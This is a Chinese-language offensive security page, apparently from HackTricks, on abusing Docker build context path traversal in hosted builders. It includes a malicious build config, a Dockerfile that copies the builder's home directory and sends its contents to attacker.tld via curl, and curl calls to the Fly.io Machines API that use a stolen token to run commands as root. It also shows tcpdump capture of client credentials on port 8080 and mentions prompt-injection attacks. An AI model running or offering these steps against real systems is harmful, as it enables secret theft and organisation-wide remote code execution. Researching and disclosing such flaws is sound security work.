# 在 Hosted Builders 中滥用 Docker Build Context (Path Traversal, Exfil, and Cloud Pivot)

{{#include ../banners/hacktricks-training.md}}

## TL;DR

如果一个 CI/CD 平台或 hosted builder 允许贡献者指定 Docker build context 路径和 Dockerfile 路径，你通常可以将 context 设置为父目录（例如 ".."），使主机文件成为 build context 的一部分。然后，攻击者控制的 Dockerfile 可以使用 COPY 并 exfiltrate 位于 builder 用户主目录的秘密（例如 ~/.docker/config.json）。被窃取的 registry tokens 也可能对提供商的 control-plane APIs 生效，从而导致 org-wide RCE。

## Attack surface

许多 hosted builder/registry services 在构建用户提交的镜像时大致按以下方式工作：
- 读取包含以下内容的 repo 级配置：
- build context path（发送给 Docker daemon）
- Dockerfile path（相对于该 context）
- 将指定的 build context 目录和 Dockerfile 复制到 Docker daemon
- 构建镜像并以托管服务运行

如果平台没有对 build context 进行规范化并加以限制，用户可以将其设置为仓库之外的位置（path traversal），使构建用户可读的任意主机文件成为 build context 的一部分，并可在 Dockerfile 中被 COPY。

常见的实际限制：
- Dockerfile 必须位于所选 context 路径内，且其路径必须事先已知。
- 构建用户必须对包含在 context 中的文件具有读取权限；特殊设备文件可能会导致复制失败。

## PoC: Path traversal via Docker build context

示例恶意服务器配置，声明一个位于父目录上下文中的 Dockerfile：
```yaml
runtime: "container"
build:
dockerfile: "test/Dockerfile"   # Must reside inside the final context
dockerBuildPath: ".."           # Path traversal to builder user $HOME
startCommand:
type: "http"
configSchema:
type: "object"
properties:
apiKey:
type: "string"
required: ["apiKey"]
exampleConfig:
apiKey: "sk-example123"
```
注意：
- 使用 ".." 常常解析到 builder 用户的 home（例如 /home/builder），该目录通常包含敏感文件。
- 将你的 Dockerfile 放在 repo 的目录名下（例如 repo "test" → test/Dockerfile），这样它会保持在展开的父上下文内。

## PoC: Dockerfile 用于摄取并 exfiltrate 主机上下文
```dockerfile
FROM alpine
RUN apk add --no-cache curl
RUN mkdir /data
COPY . /data                      # Copies entire build context (now builder’s $HOME)
RUN curl -si https://attacker.tld/?d=$(find /data | base64 -w 0)
```
常见从 $HOME 恢复的目标：
- ~/.docker/config.json (registry auths/tokens)
- 其他 cloud/CLI 缓存和配置（例如：~/.fly, ~/.kube, ~/.aws, ~/.config/*）

提示：即使仓库中存在 .dockerignore，易受攻击的平台端上下文选择仍然决定发送到 daemon 的内容。如果平台在评估你仓库的 .dockerignore 之前就将所选路径复制到 daemon，主机文件仍可能被暴露。

## Cloud pivot — 使用权限过大的 tokens (example: Fly.io Machines API)

某些平台会签发单个 bearer token，可同时用于 container registry 和 control-plane API。如果你窃取了 registry token，尝试将其用于 provider API。

使用从 ~/.docker/config.json 偷取的 token 对 Fly.io Machines API 的示例 API 调用：

列举 org 中的 apps：
```bash
curl -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps?org_slug=smithery"
```
在应用的任何机器中以 root 身份运行命令：
```bash
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"","command":["id"],"container":"","stdin":"","timeout":5}'
```
结果：在 token 拥有足够权限时，可对所有托管应用实现整个组织范围的 remote code execution。

## 来自被攻陷的托管服务的机密窃取

在托管服务器上获得 exec/RCE 后，你可以收集客户端提供的 secrets（API keys、tokens），或发起 prompt-injection attacks。示例：安装 tcpdump 并捕获 port 8080 上的 HTTP 流量以提取传入 credentials。
```bash
# Install tcpdump inside the machine
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"apk add tcpdump","command":[],"container":"","stdin":"","timeout":5}'

# Capture traffic
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"tcpdump -i eth0 -w /tmp/log tcp port 8080","command":[],"container":"","stdin":"","timeout":5}'
```
捕获到的请求通常会在 headers、bodies 或 query params 中包含 client credentials。

## 参考资料

- [Breaking MCP Server Hosting: Build-Context Path Traversal to Org-wide RCE and Secret Theft](https://blog.gitguardian.com/breaking-mcp-server-hosting/)
- [Fly.io Machines API](https://fly.io/docs/machines/api/)

{{#include ../banners/hacktricks-training.md}}
